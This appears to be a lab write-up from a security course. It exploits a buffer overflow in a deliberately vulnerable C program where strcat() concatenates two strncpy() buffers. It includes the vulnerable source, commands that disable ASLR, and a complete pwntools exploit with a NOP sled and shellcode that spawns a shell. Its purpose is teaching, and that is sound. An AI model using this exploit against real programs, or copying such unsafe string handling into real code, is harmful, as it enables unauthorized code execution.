It is sometimes mistakenly said that `strncpy()` is guaranteed to prevent
the issues that come with buffer overflow. This exercise is an example of
a buffer-overflow on a program which uses `strncpy()`.

## Setup

***

The vulnerable program is

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define BUFFER_SIZE 1000
#define on_error(...) { fprintf(stderr, __VA_ARGS__); fflush(stderr); exit(1); }

void echo(char *arg1, char *arg2){
     char result[BUFFER_SIZE*2];
     char input1[BUFFER_SIZE];
     char input2[BUFFER_SIZE];

     strncpy(input1, arg1, BUFFER_SIZE);
     strncpy(input2, arg2, BUFFER_SIZE);
     strcat(result, input1);
     strcat(result, input2);
     printf("Echo Response: %s\n", result);
}

int main(int argc, char **argv){
    if (argc < 3) on_error("Usage: %s [argument1] [argument2]\n", argv[0]);
    echo(argv[1], argv[2]);
    return 0;
}
```

Following our previous similar labs,
ASLR and dmesg restrict are disabled

```
$ docker run --rm -v $(pwd):/shared --privileged -it thierrysans/vulnerable:stack-smashing-shellcode bash
# echo 0 > /proc/sys/kernel/randomize_va_space
# echo 0 > /proc/sys/kernel/dmesg_restrict
```

## The Exploit

***

Though `strncpy()` only copies a set number of bytes, `strcat()` has the flexibility we need for the exploit.
We start by compiling and disassembling the executable

```
/shared# gcc vuln.c -o vuln -fno-stack-protector -m32 -z execstack
/shared# objdump -d -M intel vuln > dump.dmp
```

Since there are two buffers, we have two payloads and from the decompilation we know
the memory looks something like

```
      +--------+ <- start of second buffer
      |        |
      |        |
      |        |
      |        |
      |        |
      |        |
      |        |
      |        |
      +--------+ <- start of first buffer
      |        |
      |        |
      |        |
      |        |
      |        |
      |        |
      |        |
      +--------+
      ~  ..... ~
      +--------+
      |        | <- return address
      |        |
      +--------+  
```

The goal is to craft payloads so after the exploit it looks more like

```
      +--------+ <- start of second buffer
      |  NOP   |
      |  SLED  |
 addr |        | <- want to jump somewhere in the middle
      |        |
      +--------+
      | SHELL  | <- our planted shellcode
      | CODE   |
      |        |
      |        |
      |        |
      |        |
      +--------+
      ~  ..... ~ <- additional padding b'b'
      +--------+
      |   a    |
      |   a    |
      |   a    |
      +--------+
      ~  ..... ~ <- padding b'a'
      +--------+
      |  addr  | <- return address
      |        |
      +--------+  
```

The exploit starts very much like our [previous exercise]().

```python
from pwn import *
from shellcode import get_shellcode

pwnlib.term.term_mode= False

''' returns the payload for the attack
    given the path to the vulnerable binary
    and the shellcode from get_shellcode in shellcode.py
    (string, bytes) -> bytes
'''
def craft_payload(path_to_vuln_prgm, shellcode):
    # size of buffers after compilation:
    # result: 2008 (shift by 0x7d8)
    # input1 and input2: 1000 (shift by 0xbc0 and 0xfa8 respectively)
    p = process([path_to_vuln_prgm, b'a'*508, b'b'*1000])
    p.wait_for_close()
    debug_msg = process('dmesg | grep "vuln" | tail -n 1', stdout=subprocess.PIPE,
            shell=True).recvall()

    esp = int(re.search(b'sp\ (.*)\ error', debug_msg).group(1), 16)

    # want 4294951440
    # addr = 0xffffc210
    addr = esp - 3250
    nop_len = 768
```

A small technical point is that pwnlib complains if we have null bytes in the argument.
After some experimentation, we notice the first two bytes tend to be `0xff` and the next
one quite large (around `0xc0`) so the problem one is the lowest which can be `0x00`.
A simple solution is if we detect this, simply shift it so we land on our NOP sled

```python
    if b'\x00' in p32(addr)[:-1]:
        addr = addr + 32
    payload1 = b'a'* 504 + p32(addr)
    payload2 = b'\x90'*nop_len + shellcode + b'b'*(1000-len(shellcode)-nop_len)
    return (payload1, payload2)
```

notice `payload2` has no null terminator so `strcat()` will overflow
its contents into the first buffer

Finally, we have the main driver for our exploit which is also quite similar to last
time

```python
def run(path_to_vuln_prgm):
    interactive, shellcode = get_shellcode()
    payload = craft_payload(path_to_vuln_prgm, shellcode)
    p = process([path_to_vuln_prgm, payload[0], payload[1]])
    p.interactive()
```

with `shellcode.py` being

```python
from pwn import *

def get_shellcode():
      return asm(shellcraft.i386.linux.sh())
```

## Cleanup

***

When cleaning up,
make sure that the security features on your machine have not been altered:

```
$ echo 2 > /proc/sys/kernel/randomize_va_space
$ echo 1 > /proc/sys/kernel/dmesg_restrict
```

also don't forget to [clean up](/crypto/2020/10/08/05-lab.html#docker-cleanup)
after Docker.
